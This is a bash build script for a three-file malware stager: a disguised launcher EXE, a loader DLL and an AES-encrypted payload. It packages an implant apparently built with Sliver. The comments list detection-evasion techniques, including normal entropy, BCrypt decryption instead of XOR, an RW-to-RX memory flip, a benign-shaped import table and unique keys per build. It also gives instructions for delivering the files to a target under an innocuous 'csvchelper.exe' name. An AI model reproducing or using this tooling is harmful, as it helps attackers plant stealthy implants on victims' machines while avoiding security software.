#!/usr/bin/env bash
#
# bundle-stager.sh — build the three-file Crystal Palace stager
#
# Outputs three files that must be delivered together (same directory):
#   csvchelper.exe   launcher stub — decrypts payload.dat, hands plaintext
#                    to csvhelper.dll's PluginRun export
#   csvhelper.dll    combase!CoUninitialize slot loader plugin
#   payload.dat      AES-256-CBC encrypted PICO (opaque binary, no PE)
#
# Evasion improvements over run.x64.exe / single-file embedded approach:
#   - launcher stub has no embedded payload → normal size and entropy
#   - AES-256-CBC decryption (BCrypt) instead of a suspicious XOR loop
#   - Slot flip (RW→memcpy→RX) + CreateThread isolated in the plugin DLL,
#     keeping the launcher's IAT purely crypto+filesystem shaped
#   - payload.dat is opaque ciphertext: no PE headers, no Crystal Palace sigs
#   - Fresh random key+IV every build → unique launcher + payload.dat
#   - GUI subsystem, version info resource, advapi32 + bcrypt in IAT
#
# Usage:
#   ./bundle-stager.sh <implant.crystal.bin> [output-dir/csvchelper.exe]
#
# Typical flow:
#   ./generate-implant.sh --dll /tmp/sliver.dll build/sliver.crystal.bin
#   ./bundle-stager.sh build/sliver.crystal.bin build/csvchelper.exe
#
# IMPORTANT: deliver ALL THREE files from the same directory.
#   cp build/csvchelper.exe  /delivery/
#   cp build/csvhelper.dll   /delivery/
#   cp build/payload.dat     /delivery/
#
# NOTE: csvhelper.dll must NOT be renamed on the target — its filename is
# a compile-time literal (-DPLUGIN_NAME) baked into the launcher's .rdata.
# To rename, rebuild with `make PLUGIN_NAME=<newname>.dll`.

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

PICO="${1:?Usage: bundle-stager.sh <implant.crystal.bin> [output.exe]}"
OUTPUT="${2:-$SCRIPT_DIR/build/stager.exe}"

if [[ ! -f "$PICO" ]]; then
    echo "error: PICO not found: $PICO" >&2
    exit 2
fi

PICO_ABS="$(cd "$(dirname "$PICO")" && pwd)/$(basename "$PICO")"
BUILD_DIR="$(cd "$(dirname "$OUTPUT")" && pwd)"
OUTPUT_ABS="$BUILD_DIR/$(basename "$OUTPUT")"
PLUGIN_ABS="$BUILD_DIR/csvhelper.dll"
PAYDAT_ABS="$BUILD_DIR/payload.dat"

mkdir -p "$BUILD_DIR"

echo "[*] Building three-file stager..."
echo "    PICO:          $PICO_ABS ($(wc -c < "$PICO_ABS") bytes)"
echo "    launcher.exe:  $OUTPUT_ABS"
echo "    csvhelper.dll: $PLUGIN_ABS"
echo "    payload.dat:   $PAYDAT_ABS"
echo ""

make -C "$SCRIPT_DIR/stager" \
    PICO="$PICO_ABS" \
    OUTPUT="$OUTPUT_ABS"

EXE_SIZE=$(wc -c < "$OUTPUT_ABS")
DLL_SIZE=$(wc -c < "$PLUGIN_ABS")
DAT_SIZE=$(wc -c < "$PAYDAT_ABS")
echo ""
echo "[+] Build complete"
echo "    launcher.exe  : $OUTPUT_ABS   ($EXE_SIZE bytes)"
echo "    csvhelper.dll : $PLUGIN_ABS   ($DLL_SIZE bytes)"
echo "    payload.dat   : $PAYDAT_ABS   ($DAT_SIZE bytes)"
echo ""
echo "    Deliver ALL THREE files to the target (same directory)."
echo "    launcher resolves payload.dat AND csvhelper.dll relative to its own location."
echo "    Do NOT rename csvhelper.dll — filename is a compile-time literal in the launcher."
echo ""
echo "    Rename launcher.exe to match resource.rc OriginalFilename:"
echo "    e.g.  mv \$(basename "$OUTPUT_ABS") csvchelper.exe"
